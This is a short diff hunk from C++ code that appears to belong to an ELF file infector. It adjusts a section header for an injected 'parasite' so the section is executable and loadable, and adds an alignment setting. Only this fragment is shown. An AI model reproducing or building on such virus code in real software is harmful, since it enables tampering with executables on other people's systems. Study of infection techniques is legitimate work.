@@ -34,6 +34,7 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr, uint64_t virus_size,
       section_entry->sh_addr = info.parasite_load_address;
       section_entry->sh_type = SHT_PROGBITS;
       section_entry->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
+      section_entry->sh_addralign = 64;
       return true;
     }
     // Move to the next section entry
